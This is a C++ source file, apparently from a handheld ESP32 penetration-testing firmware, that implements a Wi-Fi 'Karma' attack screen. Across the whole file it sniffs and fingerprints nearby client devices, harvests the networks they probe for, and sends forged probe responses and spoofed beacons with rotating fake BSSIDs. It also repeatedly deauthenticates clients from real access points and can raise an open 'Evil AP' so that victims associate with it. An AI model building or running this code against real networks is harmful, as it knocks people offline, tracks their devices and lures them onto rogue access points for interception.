#include "WifiKarmaBroadcastScreen.h"
#include "core/Device.h"
#include "core/ScreenManager.h"
#include "ui/actions/ShowStatusAction.h"
#include "ui/actions/InputSelectAction.h"
#include "ui/components/StatusBar.h"
#include "ui/components/Header.h"

#include <WiFi.h>
#include <esp_wifi.h>
#include <FS.h>
#include <string.h>

WifiKarmaBroadcastScreen* WifiKarmaBroadcastScreen::_instance = nullptr;

static const char* const kSeedSsids[] = {
  "Free WiFi", "xfinitywifi", "NETGEAR", "linksys",
  "TP-Link", "AndroidAP", "Guest", "attwifi",
};

// ── Lifecycle ────────────────────────────────────────────────────────────────

WifiKarmaBroadcastScreen::~WifiKarmaBroadcastScreen()
{
  _stopAttack();
  _instance = nullptr;
}

void WifiKarmaBroadcastScreen::onInit()
{
  _instance = this;
  // No pre-run config list — start immediately; every setting and control is
  // reachable from the in-run options menu (PRESS to open).
  _startAttack();
}

const char* WifiKarmaBroadcastScreen::_modeName() const
{
  switch (_mode) {
    case MODE_PASSIVE:   return "Passive";
    case MODE_BROADCAST: return "Broadcast";
    default:             return "Full";
  }
}

// ── SSID file ────────────────────────────────────────────────────────────────

void WifiKarmaBroadcastScreen::_loadFile()
{
  _ssidCount = 0;
  _fileCount = 0;
  if (!Uni.Storage || !Uni.Storage->isAvailable()) return;

  const char* path = "/unigeek/wifi/karma_ssids.txt";
  if (!Uni.Storage->exists(path)) return;

  fs::File f = Uni.Storage->open(path, FILE_READ);
  if (!f) return;
  while (f.available() && _ssidCount < MAX_SSID) {
    String line = f.readStringUntil('\n');
    line.trim();
    if (line.length() < 1 || line.length() > 32) continue;
    strncpy(_ssids[_ssidCount], line.c_str(), 32);
    _ssids[_ssidCount][32] = '\0';
    _hits[_ssidCount] = 0;
    _ssidCount++;
    _fileCount++;
  }
  f.close();
}

// ── Start / Stop ─────────────────────────────────────────────────────────────

void WifiKarmaBroadcastScreen::_startAttack()
{
  _state = STATE_RUNNING;
  _log.clear();

  // Seed pool: file SSIDs first, then a few common defaults so the attack
  // does something before any SSID is harvested from probes.
  _loadFile();
  if (_ssidCount == 0) {
    for (auto s : kSeedSsids) {
      if (_ssidCount >= MAX_SSID) break;
      strncpy(_ssids[_ssidCount], s, 32);
      _ssids[_ssidCount][32] = '\0';
      _hits[_ssidCount] = 0;
      _ssidCount++;
    }
  }

  _fpCount     = 0;
  _apCount     = 0;
  _beaconIdx   = 0;
  _beaconPass  = 0;
  _beaconsSent = 0;
  _karmaSent   = 0;
  _probeCount  = 0;
  _channel     = 1;
  _paused      = false;
  _evilAp      = false;
  _evilApSsid  = "";
  _prqHead = _prqTail = 0;
  _lastHop = _lastBeacon = _lastDeauth = _lastDraw = millis();

  // Session fake-AP BSSID (locally administered, unicast).
  for (int i = 0; i < 6; i++) _bssid[i] = (uint8_t)random(0, 256);
  _bssid[0] = (_bssid[0] & 0xFE) | 0x02;
  _lastMacRot = millis();

  // APSTA (no visible softAP) — brings up the AP interface for raw 802.11 TX.
  _attacker = new WifiAttackUtil(false);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&_promiscuousCb);
  esp_wifi_set_channel(_channel, WIFI_SECOND_CHAN_NONE);

  _log.addLine("[*] Karma Attack started");
  _log.addLine((String("[*] Mode: ") + _modeName()).c_str());
  _log.addLine(_wpa2 ? "[*] Mimicry WPA2 (RSN)" : "[*] Mimicry open");
  if (_autoKarma) _log.addLine("[*] Karma responses ON");
  if (_deauth)    _log.addLine("[*] Integrated deauth ON");
  _log.addLine("[*] </> ch  OK pause  BACK stop");
  render();
}

void WifiKarmaBroadcastScreen::_stopAttack()
{
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(NULL);
  if (_attacker) { delete _attacker; _attacker = nullptr; }  // dtor powers WiFi off
}

// ── Probe / beacon sniffer + fingerprint ────────────────────────────────────

uint32_t WifiKarmaBroadcastScreen::_fingerprint(const uint8_t* frame, uint16_t len)
{
  // FNV-1a over the tagged parameters (IEs), skipping the SSID element so the
  // hash identifies the *device* regardless of which network it probes for or
  // which randomized MAC it uses.
  uint32_t h = 2166136261u;
  int i = 24;
  while (i + 2 <= (int)len) {
    uint8_t id = frame[i];
    uint8_t l  = frame[i + 1];
    if (i + 2 + l > (int)len) break;
    if (id != 0x00) {
      h = (h ^ id) * 16777619u;
      h = (h ^ l)  * 16777619u;
      for (int k = 0; k < l; k++) h = (h ^ frame[i + 2 + k]) * 16777619u;
    }
    i += 2 + l;
  }
  return h;
}

int WifiKarmaBroadcastScreen::_addSsid(const char* ssid)
{
  // Caller must hold _lock. Existing → bump tier score; new → append.
  for (int i = 0; i < _ssidCount; i++) {
    if (strcmp(_ssids[i], ssid) == 0) {
      if (_hits[i] < 0xFFFF) _hits[i]++;
      return i;
    }
  }
  if (_ssidCount >= MAX_SSID) return -1;
  strncpy(_ssids[_ssidCount], ssid, 32);
  _ssids[_ssidCount][32] = '\0';
  _hits[_ssidCount] = 1;
  return _ssidCount++;
}

void WifiKarmaBroadcastScreen::_promiscuousCb(void* buf, wifi_promiscuous_pkt_type_t type)
{
  if (!_instance || type != WIFI_PKT_MGMT) return;

  const wifi_promiscuous_pkt_t* pkt = (const wifi_promiscuous_pkt_t*)buf;
  const uint8_t* frame = pkt->payload;
  const uint16_t len   = (uint16_t)pkt->rx_ctrl.sig_len;
  const uint8_t  ch    = pkt->rx_ctrl.channel;
  if (len < 26) return;

  const uint8_t ft = frame[0];

  if (ft == 0x40) {  // Probe Request → harvest SSID + fingerprint + queue karma
    uint8_t sl = frame[25];
    char ssid[33];
    ssid[0] = '\0';
    if (sl >= 1 && sl <= 32 && (26 + sl) <= len) {
      memcpy(ssid, &frame[26], sl);
      ssid[sl] = '\0';
    }
    uint32_t fp = _fingerprint(frame, len);
    const uint8_t* clientMac = &frame[10];

    portENTER_CRITICAL(&_instance->_lock);
    _instance->_probeCount++;
    bool seen = false;
    for (int i = 0; i < _instance->_fpCount; i++) {
      if (_instance->_fingerprints[i] == fp) { seen = true; break; }
    }
    if (!seen && _instance->_fpCount < MAX_FP) _instance->_fingerprints[_instance->_fpCount++] = fp;
    if (ssid[0] != '\0') {
      _instance->_addSsid(ssid);
      // Queue a directed karma response for this client (drained in onUpdate).
      int next = (_instance->_prqTail + 1) % PRQ;
      if (next != _instance->_prqHead) {
        ProbeReq& e = _instance->_prq[_instance->_prqTail];
        strncpy(e.ssid, ssid, 32);
        e.ssid[32] = '\0';
        memcpy(e.mac, clientMac, 6);
        e.ch = ch;
        _instance->_prqTail = next;
      }
    }
    portEXIT_CRITICAL(&_instance->_lock);

  } else if (ft == 0x80) {  // Beacon → learn a real AP (deauth target)
    if (len < 38) return;
    uint8_t sl = frame[37];
    if (sl > 32 || (38 + sl) > len) return;
    char ssid[33];
    memcpy(ssid, &frame[38], sl);
    ssid[sl] = '\0';
    const uint8_t* bssid = &frame[16];

    portENTER_CRITICAL(&_instance->_lock);
    bool found = false;
    for (int i = 0; i < _instance->_apCount; i++) {
      if (memcmp(_instance->_aps[i].bssid, bssid, 6) == 0) {
        _instance->_aps[i].channel = ch;
        found = true;
        break;
      }
    }
    if (!found && _instance->_apCount < MAX_AP) {
      RealAp& ap = _instance->_aps[_instance->_apCount];
      memcpy(ap.bssid, bssid, 6);
      ap.channel = ch;
      strncpy(ap.ssid, ssid, 32);
      ap.ssid[32] = '\0';
      _instance->_apCount++;
    }
    portEXIT_CRITICAL(&_instance->_lock);
  }
}

// ── Karma probe responses ─────────────────────────────────────────────────────

void WifiKarmaBroadcastScreen::_drainProbeQueue()
{
  if (!_attacker) return;

  // Process a bounded number per update so we don't stall the UI.
  for (int guard = 0; guard < 8; guard++) {
    ProbeReq e;
    bool have = false;
    portENTER_CRITICAL(&_lock);
    if (_prqHead != _prqTail) {
      e = _prq[_prqHead];
      _prqHead = (_prqHead + 1) % PRQ;
      have = true;
    }
    portEXIT_CRITICAL(&_lock);
    if (!have) break;

    uint8_t ch = (e.ch >= 1 && e.ch <= 14) ? e.ch : _channel;
    _attacker->probeResponse(e.ssid, e.mac, ch, _wpa2, _bssid);
    _karmaSent++;
  }
}

// ── Beacon pass ──────────────────────────────────────────────────────────────

void WifiKarmaBroadcastScreen::_doBeaconPass()
{
  if (!_attacker) return;

  // Snapshot up to 8 SSIDs (round-robin) under the lock, then beacon outside it
  // (beaconSpam blocks a few ms — must not hold the spinlock across it).
  char batch[8][33];
  int  m = 0;
  int  topIdx = -1;
  uint16_t topHits = 0;
  portENTER_CRITICAL(&_lock);
  int cnt = _ssidCount;
  for (int k = 0; k < 8 && cnt > 0; k++) {
    int idx = _beaconIdx % cnt;
    _beaconIdx++;
    strncpy(batch[m], _ssids[idx], 32);
    batch[m][32] = '\0';
    m++;
  }
  // Find the SSID with the most probe responses (highest tier) for priority.
  if (_prioritize) {
    for (int i = 0; i < cnt; i++) {
      if (_hits[i] > topHits) { topHits = _hits[i]; topIdx = i; }
    }
  }
  char topSsid[33] = {0};
  if (topIdx >= 0) { strncpy(topSsid, _ssids[topIdx], 32); topSsid[32] = '\0'; }
  portEXIT_CRITICAL(&_lock);

  // Every 10th pass, front-load the highest-tier SSID (response-based priority).
  _beaconPass++;
  if (_prioritize && topHits > 0 && (_beaconPass % 10 == 0)) {
    _attacker->beaconSpam(topSsid, _channel, _wpa2, _bssid);
    _beaconsSent++;
  }

  for (int k = 0; k < m; k++) {
    _attacker->beaconSpam(batch[k], _channel, _wpa2, _bssid);
    _beaconsSent++;
  }
}

// ── Update ───────────────────────────────────────────────────────────────────

void WifiKarmaBroadcastScreen::onUpdate()
{
  if (_state != STATE_RUNNING) {
    ListScreen::onUpdate();
    return;
  }

  if (Uni.Nav->wasPressed()) {
    const auto dir = Uni.Nav->readDirection();
    if (dir == INavigation::DIR_BACK) {
      _stopAttack();
      Screen.goBack();
      return;
    }
    if (dir == INavigation::DIR_PRESS) {
      // Open the in-run options menu (blocking modal). Redraw after it closes.
      _openOptions();
      if (_state == STATE_RUNNING) { _lastDraw = 0; render(); }
      return;
    } else if (dir == INavigation::DIR_RIGHT || dir == INavigation::DIR_UP) {
      _channel = (_channel >= 13) ? 1 : _channel + 1;
      esp_wifi_set_channel(_channel, WIFI_SECOND_CHAN_NONE);
      _lastHop = millis();
    } else if (dir == INavigation::DIR_LEFT || dir == INavigation::DIR_DOWN) {
      _channel = (_channel <= 1) ? 13 : _channel - 1;
      esp_wifi_set_channel(_channel, WIFI_SECOND_CHAN_NONE);
      _lastHop = millis();
    }
  }

  unsigned long now = millis();

  if (!_paused) {
    // Rotate the fake-AP BSSID periodically (skip while a real AP is up so a
    // connected victim isn't disturbed).
    if (!_evilAp && now - _lastMacRot > 30000) _rotateMac();

    // Auto channel hop so beacons + sniffing cover the 2.4 GHz band. Pinned
    // while a real AP is up so associated clients don't get dropped.
    if (_autoHop && !_evilAp && now - _lastHop > (unsigned long)_hopIntMs) {
      _channel = (_channel >= 13) ? 1 : _channel + 1;
      esp_wifi_set_channel(_channel, WIFI_SECOND_CHAN_NONE);
      _lastHop = now;
    }

    // Karma responses (Passive/Full) — answer directed probes as a fake AP.
    if (_autoKarma && _mode != MODE_BROADCAST) {
      _drainProbeQueue();
    } else {
      // Keep the queue from filling if karma is off in this mode.
      portENTER_CRITICAL(&_lock);
      _prqHead = _prqTail;
      portEXIT_CRITICAL(&_lock);
    }

    // Beaconing (Broadcast/Full) — advertise the SSID pool.
    if (_beaconing && _mode != MODE_PASSIVE && now - _lastBeacon > (unsigned long)_beaconMs) {
      _doBeaconPass();
      _lastBeacon = now;
    }

    // Integrated deauth: kick clients off real APs on this channel so they roam.
    if (_deauth && _attacker && now - _lastDeauth > 800) {
      RealAp aps[MAX_AP];
      int ac;
      portENTER_CRITICAL(&_lock);
      ac = _apCount;
      memcpy(aps, _aps, sizeof(RealAp) * ac);
      portEXIT_CRITICAL(&_lock);
      for (int i = 0; i < ac; i++) {
        if (aps[i].channel == _channel) {
          MacAddr b;
          memcpy(b, aps[i].bssid, 6);
          _attacker->deauthenticate(b, _channel);
        }
      }
      _lastDeauth = now;
    }
  }

  if (now - _lastDraw > 500) {
    render();
    _lastDraw = now;
  }
}

void WifiKarmaBroadcastScreen::onRender()
{
  if (_state == STATE_RUNNING) { _drawLog(); return; }
  ListScreen::onRender();
}

void WifiKarmaBroadcastScreen::onBack()
{
  if (_state == STATE_RUNNING) _stopAttack();
  Screen.goBack();
}

// ── Live dashboard ───────────────────────────────────────────────────────────

void WifiKarmaBroadcastScreen::_drawLog()
{
  _log.draw(Uni.Lcd, bodyX(), bodyY(), bodyW(), bodyH(),
    [](Sprite& sp, int barY, int w, void* ud) {
      auto* s = static_cast<WifiKarmaBroadcastScreen*>(ud);
      sp.setTextColor(s->_paused ? TFT_ORANGE : TFT_GREEN, TFT_BLACK);
      sp.setTextDatum(TL_DATUM);
      char stats[52];
      snprintf(stats, sizeof(stats), "C:%d S:%d K:%lu ch%d",
               s->_fpCount, s->_ssidCount,
               (unsigned long)s->_karmaSent, s->_channel);
      sp.drawString(stats, 2, barY);
      sp.setTextDatum(TR_DATUM);
      const char* tag = s->_evilAp ? "EVIL-AP"
                      : s->_paused ? "PAUSED" : s->_modeName();
      sp.drawString(tag, w - 2, barY);
    }, this);
}

// ══════════════════════════════════════════════════════════════════════════════
// In-run options menu (opened with PRESS while running) — mirrors the runtime
// controls of the reference Karma engine, in Unigeek's modal-select idiom.
// ══════════════════════════════════════════════════════════════════════════════

void WifiKarmaBroadcastScreen::_openOptions()
{
  // Stays open, cursor parked on the last-used item, so a setting can be
  // changed repeatedly. BACK closes the menu and returns to the dashboard.
  const char* def = nullptr;
  while (true) {
    String pauseLbl = _paused ? "Resume Karma" : "Pause Karma";
    InputSelectAction::Option opts[] = {
      {"Rotate MAC Now",    "rotate"},
      {pauseLbl.c_str(),    "pause"},
      {"Set Mode",          "mode"},
      {"Channel Control",   "channel"},
      {"Attack Settings",   "attack"},
      {"Attack Strategy",   "strategy"},
      {"Broadcast Control", "broadcast"},
      {"Evil AP (Real)",    "evilap"},
      {"Show Stats",        "stats"},
      {"Save Probes",       "save"},
      {"Clear Probes",      "clear"},
      {"Stop Karma",        "stop"},
    };
    const char* r = InputSelectAction::popup("Karma Options", opts, sizeof(opts) / sizeof(opts[0]), def);
    if (!r) return;
    def = r;  // keep the highlight on the item just used

    if (!strcmp(r, "rotate")) {
      _rotateMac();
      ShowStatusAction::show("MAC rotated", 800);
    } else if (!strcmp(r, "pause")) {
      _paused = !_paused;
      ShowStatusAction::show(_paused ? "Karma paused" : "Karma resumed", 800);
    } else if (!strcmp(r, "mode")) {
      _optSetMode();
    } else if (!strcmp(r, "channel")) {
      _optChannelControl();
    } else if (!strcmp(r, "attack")) {
      _optAttackSettings();
    } else if (!strcmp(r, "strategy")) {
      _optAttackStrategy();
    } else if (!strcmp(r, "broadcast")) {
      _optBroadcastControl();
    } else if (!strcmp(r, "evilap")) {
      _optEvilAp();
    } else if (!strcmp(r, "stats")) {
      _showStats();
    } else if (!strcmp(r, "save")) {
      _saveProbes();
    } else if (!strcmp(r, "clear")) {
      portENTER_CRITICAL(&_lock);
      _ssidCount = 0;
      _fpCount   = 0;
      portEXIT_CRITICAL(&_lock);
      _loadFile();
      ShowStatusAction::show("Probes cleared", 800);
    } else if (!strcmp(r, "stop")) {
      _stopAttack();
      Screen.goBack();
      return;
    }
  }
}

void WifiKarmaBroadcastScreen::_optSetMode()
{
  const char* def = (_mode == MODE_PASSIVE) ? "0" : (_mode == MODE_BROADCAST) ? "1" : "2";
  while (true) {
    InputSelectAction::Option o[] = {
      {"Passive (listen)",     "0"},
      {"Broadcast (beacon)",   "1"},
      {"Full (both)",          "2"},
    };
    const char* r = InputSelectAction::popup("Set Mode", o, 3, def);
    if (!r) return;
    def = r;
    _mode = (Mode)atoi(r);
    ShowStatusAction::show(_modeName(), 800);
  }
}

void WifiKarmaBroadcastScreen::_optChannelControl()
{
  const char* def = nullptr;
  while (true) {
    String hopLbl = String("Auto Hop: ") + (_autoHop ? "On" : "Off");
    InputSelectAction::Option o[] = {
      {"Next Channel",     "next"},
      {"Previous Channel", "prev"},
      {hopLbl.c_str(),     "hop"},
      {"Set Interval",     "ivl"},
    };
    const char* r = InputSelectAction::popup("Channel Control", o, 4, def);
    if (!r) return;
    def = r;

    if (!strcmp(r, "next")) {
      _channel = (_channel >= 13) ? 1 : _channel + 1;
      esp_wifi_set_channel(_channel, WIFI_SECOND_CHAN_NONE);
      _lastHop = millis();
    } else if (!strcmp(r, "prev")) {
      _channel = (_channel <= 1) ? 13 : _channel - 1;
      esp_wifi_set_channel(_channel, WIFI_SECOND_CHAN_NONE);
      _lastHop = millis();
    } else if (!strcmp(r, "hop")) {
      _autoHop = !_autoHop;
      ShowStatusAction::show(_autoHop ? "Auto Hop ON" : "Auto Hop OFF", 800);
    } else if (!strcmp(r, "ivl")) {
      char cur[6]; snprintf(cur, sizeof(cur), "%d", _hopIntMs);
      InputSelectAction::Option iv[] = {
        {"500 ms",  "500"},  {"1000 ms", "1000"},
        {"2000 ms", "2000"}, {"3000 ms", "3000"},
      };
      const char* v = InputSelectAction::popup("Hop Interval", iv, 4, cur);
      if (v) _hopIntMs = atoi(v);
    }
  }
}

void WifiKarmaBroadcastScreen::_optAttackSettings()
{
  const char* def = nullptr;
  while (true) {
    String ak = String("Auto Karma: ") + (_autoKarma ? "On" : "Off");
    String bc = String("Beaconing: ")  + (_beaconing ? "On" : "Off");
    String da = String("Deauth: ")     + (_deauth    ? "On" : "Off");
    String se = String("Security: ")   + (_wpa2      ? "WPA2" : "Open");
    InputSelectAction::Option o[] = {
      {ak.c_str(), "ak"}, {bc.c_str(), "bc"}, {da.c_str(), "da"}, {se.c_str(), "se"},
    };
    const char* r = InputSelectAction::popup("Attack Settings", o, 4, def);
    if (!r) return;
    def = r;

    if (!strcmp(r, "ak")) {
      _autoKarma = !_autoKarma;
      ShowStatusAction::show(_autoKarma ? "Auto Karma ON" : "Auto Karma OFF", 800);
    } else if (!strcmp(r, "bc")) {
      _beaconing = !_beaconing;
      ShowStatusAction::show(_beaconing ? "Beaconing ON" : "Beaconing OFF", 800);
    } else if (!strcmp(r, "da")) {
      _deauth = !_deauth;
      ShowStatusAction::show(_deauth ? "Deauth ON" : "Deauth OFF", 800);
    } else if (!strcmp(r, "se")) {
      _wpa2 = !_wpa2;
      ShowStatusAction::show(_wpa2 ? "Mimicry WPA2" : "Mimicry Open", 800);
    }
  }
}

void WifiKarmaBroadcastScreen::_optAttackStrategy()
{
  const char* def = nullptr;
  while (true) {
    String pr = String("Prioritize: ") + (_prioritize ? "On" : "Off");
    String sp = String("Beacon Speed: ") +
                ((_beaconMs == 200) ? "Fast" : (_beaconMs == 500) ? "Slow" : "Normal");
    InputSelectAction::Option o[] = {
      {pr.c_str(), "pr"}, {sp.c_str(), "spd"},
    };
    const char* r = InputSelectAction::popup("Attack Strategy", o, 2, def);
    if (!r) return;
    def = r;

    if (!strcmp(r, "pr")) {
      _prioritize = !_prioritize;
      ShowStatusAction::show(_prioritize ? "Prioritize ON" : "Prioritize OFF", 800);
    } else if (!strcmp(r, "spd")) {
      char cur[6]; snprintf(cur, sizeof(cur), "%d", _beaconMs);
      InputSelectAction::Option sv[] = {
        {"Fast (200ms)",   "200"},
        {"Normal (300ms)", "300"},
        {"Slow (500ms)",   "500"},
      };
      const char* v = InputSelectAction::popup("Beacon Speed", sv, 3, cur);
      if (v) _beaconMs = atoi(v);
    }
  }
}

void WifiKarmaBroadcastScreen::_optBroadcastControl()
{
  const char* def = nullptr;
  while (true) {
    String bl = _beaconing ? "Stop Broadcast" : "Start Broadcast";
    InputSelectAction::Option o[] = {
      {bl.c_str(),    "tgl"},
      {"Set Speed",   "spd"},
      {"Show Stats",  "stats"},
    };
    const char* r = InputSelectAction::popup("Broadcast Control", o, 3, def);
    if (!r) return;
    def = r;

    if (!strcmp(r, "tgl")) {
      _beaconing = !_beaconing;
      ShowStatusAction::show(_beaconing ? "Broadcast started" : "Broadcast stopped", 800);
    } else if (!strcmp(r, "spd")) {
      char cur[6]; snprintf(cur, sizeof(cur), "%d", _beaconMs);
      InputSelectAction::Option sv[] = {
        {"Fast (200ms)",   "200"},
        {"Normal (300ms)", "300"},
        {"Slow (500ms)",   "500"},
      };
      const char* v = InputSelectAction::popup("Beacon Speed", sv, 3, cur);
      if (v) _beaconMs = atoi(v);
    } else if (!strcmp(r, "stats")) {
      _showStats();
    }
  }
}

void WifiKarmaBroadcastScreen::_optEvilAp()
{
  if (_evilAp) {
    InputSelectAction::Option o[] = { {"Stop Evil AP", "stop"} };
    const char* r = InputSelectAction::popup("Evil AP (active)", o, 1);
    if (r && !strcmp(r, "stop")) _stopEvilAp();
    return;
  }

  // Snapshot the harvested SSID pool for the picker.
  static char names[MAX_SSID][33];
  int n = 0;
  portENTER_CRITICAL(&_lock);
  int cnt = _ssidCount;
  for (int i = 0; i < cnt && i < MAX_SSID; i++) {
    strncpy(names[i], _ssids[i], 32);
    names[i][32] = '\0';
  }
  portEXIT_CRITICAL(&_lock);

  if (cnt == 0) { ShowStatusAction::show("No SSIDs yet", 900); return; }

  InputSelectAction::Option o[MAX_SSID];
  for (int i = 0; i < cnt && i < MAX_SSID; i++) { o[n].label = names[i]; o[n].value = names[i]; n++; }
  const char* r = InputSelectAction::popup("Evil AP: pick SSID", o, n);
  if (r) _startEvilAp(r);
}

void WifiKarmaBroadcastScreen::_rotateMac()
{
  for (int i = 0; i < 6; i++) _bssid[i] = (uint8_t)random(0, 256);
  _bssid[0] = (_bssid[0] & 0xFE) | 0x02;
  _lastMacRot = millis();
}

void WifiKarmaBroadcastScreen::_startEvilAp(const char* ssid)
{
  _evilApSsid = ssid;
  _evilAp     = true;
  _autoHop    = false;   // pin the channel so associated clients stay connected

  // A genuine open soft-AP: the ESP AP stack now answers auth/assoc, so a device
  // that trusts this (open) SSID actually connects — beacon spam alone can't.
  WiFi.softAP(ssid, nullptr, _channel, 0, 4);
  esp_wifi_set_channel(_channel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&_promiscuousCb);

  _log.addLine((String("[+] Evil AP: ") + ssid + " ch" + _channel).c_str(), TFT_CYAN);
  ShowStatusAction::show("Evil AP up", 900);
}

void WifiKarmaBroadcastScreen::_stopEvilAp()
{
  _evilAp = false;
  WiFi.softAPdisconnect(false);
  WiFi.mode(WIFI_MODE_APSTA);
  esp_wifi_set_channel(_channel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&_promiscuousCb);
  _log.addLine("[*] Evil AP stopped", TFT_DARKGREY);
  ShowStatusAction::show("Evil AP stopped", 800);
}

void WifiKarmaBroadcastScreen::_showStats()
{
  int ssidC, fpC, apC;
  uint32_t bsent, ksent, probes;
  portENTER_CRITICAL(&_lock);
  ssidC = _ssidCount; fpC = _fpCount; apC = _apCount;
  bsent = _beaconsSent; ksent = _karmaSent; probes = _probeCount;
  portEXIT_CRITICAL(&_lock);

  auto& lcd = Uni.Lcd;
  int bx = bodyX(), by = bodyY(), bw = bodyW(), bh = bodyH();

  // Keep the standard chrome (side status bar with battery/clock + header),
  // clear only the body, and lay the stats out inside it.
  StatusBar::refresh();
  Header header;
  header.render(title());
  lcd.fillRect(bx, by, bw, bh, TFT_BLACK);

  lcd.setTextSize(1);
  lcd.setTextDatum(TL_DATUM);
  int x = bx + 4;
  int y = by + 4;
  auto line = [&](const String& s, uint16_t c) {
    lcd.setTextColor(c, TFT_BLACK);
    lcd.drawString(s, x, y); y += 12;
  };
  line("== KARMA STATS ==", TFT_YELLOW);
  line(String("Probes: ")   + probes,  TFT_WHITE);
  line(String("Clients: ")  + fpC,     TFT_WHITE);
  line(String("Karma resp: ") + ksent, TFT_GREEN);
  line(String("Beacons: ")  + bsent,   TFT_WHITE);
  line(String("SSIDs: ")    + ssidC,   TFT_WHITE);
  line(String("Real APs: ") + apC,     TFT_WHITE);
  line(String("Channel: ")  + _channel + "  Mode: " + _modeName(), TFT_CYAN);
  line(String("Evil AP: ")  + (_evilAp ? _evilApSsid : String("off")), TFT_CYAN);
  y += 4;
  line("PRESS/BACK: back", TFT_DARKGREY);

  // Wait for any key, then let the caller redraw the dashboard.
  while (true) {
    Uni.update();
    if (Uni.Nav->wasPressed()) { Uni.Nav->readDirection(); break; }
    delay(10);
  }
}

void WifiKarmaBroadcastScreen::_saveProbes()
{
  if (!Uni.Storage || !Uni.Storage->isAvailable()) {
    ShowStatusAction::show("No storage", 900);
    return;
  }

  static char names[MAX_SSID][33];
  portENTER_CRITICAL(&_lock);
  int cnt = _ssidCount;
  for (int i = 0; i < cnt && i < MAX_SSID; i++) {
    strncpy(names[i], _ssids[i], 32);
    names[i][32] = '\0';
  }
  portEXIT_CRITICAL(&_lock);

  Uni.Storage->makeDir("/unigeek");
  Uni.Storage->makeDir("/unigeek/wifi");
  const char* path = "/unigeek/wifi/karma_ssids.txt";
  fs::File f = Uni.Storage->open(path, FILE_WRITE);
  if (!f) { ShowStatusAction::show("Save failed", 900); return; }
  for (int i = 0; i < cnt; i++) { f.println(names[i]); }
  f.close();
  _fileCount = cnt;
  ShowStatusAction::show((String("Saved ") + cnt + " SSIDs").c_str(), 900);
}
